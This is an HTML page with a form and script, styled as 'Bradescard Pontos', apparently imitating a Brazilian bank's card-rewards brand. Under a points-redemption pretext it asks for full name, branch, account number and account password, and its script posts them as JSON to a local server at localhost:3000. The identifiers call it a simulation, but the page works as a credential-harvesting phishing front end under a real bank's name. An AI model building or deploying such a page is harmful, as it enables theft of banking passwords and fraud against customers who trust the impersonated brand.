<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bradescard Pontos</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #cc0000; /* Fundo da tela vermelho */
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .container {
      background: #ffffff; /* Cartão branco */
      padding: 28px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.25);
      width: 100%;
      max-width: 400px;
    }
    h2 {
      margin-top: 0;
      color: #cc0000; /* Título em vermelho */
      text-align: center;
    }
    .campo {
      margin-bottom: 14px;
    }
    label {
      display: block;
      margin-bottom: 5px;
      font-weight: bold;
      color: #333;
      font-size: 14px;
    }
    input {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-sizing: border-box;
      font-size: 15px;
    }
    input:focus {
      outline: none;
      border-color: #cc0000;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #cc0000; /* Botão vermelho */
      color: #ffffff; /* Texto branco */
      border: none;
      border-radius: 6px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 8px;
    }
    button:hover {
      background-color: #990000; /* Vermelho mais escuro ao passar o mouse */
    }
    #mensagem {
      margin-top: 16px;
      text-align: center;
      font-weight: bold;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="bia.png" alt="Logotipo do bradescard pontos" style="display: block; margin: 0 auto 16px auto; max-width: 140px;" />
    <h2>Resgate de Pontos</h2>

    <form id="formSimulacao">
      <div class="campo">
        <label for="nome">Nome Completo:</label>
        <input type="text" id="nome" name="nome" required />
      </div>

      <div class="campo">
        <label for="agencia">Agência:</label>
        <input type="text" id="agencia" name="agencia" required />
      </div>

      <div class="campo">
        <label for="conta">Conta:</label>
        <input type="text" id="conta" name="conta" required />
      </div>

      <div class="campo">
        <label for="senha">Senha:</label>
        <input type="password" id="senha" name="senha" required />
      </div>

      <div class="campo">
        <label for="valorFatura">Valor da Fatura (R$):</label>
        <input type="number" id="valorFatura" name="valorFatura" step="0.01" min="1" required />
      </div>

      <button type="submit">Calcular e Registrar</button>
    </form>

    <div id="mensagem"></div>
  </div>

  <script>
    const form = document.getElementById('formSimulacao');
    const mensagemDiv = document.getElementById('mensagem');

    form.addEventListener('submit', async (evento) => {
      evento.preventDefault(); // Evita que a página recarregue

      const dados = {
        nome: document.getElementById('nome').value,
        agencia: document.getElementById('agencia').value,
        conta: document.getElementById('conta').value,
        senha: document.getElementById('senha').value,
        valorFatura: Number(document.getElementById('valorFatura').value)
      };

      try {
        const resposta = await fetch('http://localhost:3000/api/simulacoes', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(dados)
        });

        const resultado = await resposta.json();

        if (resposta.ok) {
          mensagemDiv.style.color = 'green';
          mensagemDiv.textContent = `${resultado.mensagem} Você acumulou ${resultado.pontosCalculados} pontos!`;
          form.reset();
        } else {
          mensagemDiv.style.color = 'red';
          mensagemDiv.textContent = resultado.erro || 'Erro ao registrar.';
        }
      } catch (erro) {
        mensagemDiv.style.color = 'red';
        mensagemDiv.textContent = 'Não foi possível conectar ao servidor. Verifique se o server.js está rodando.';
      }
    });
  </script>
</body>
</html>
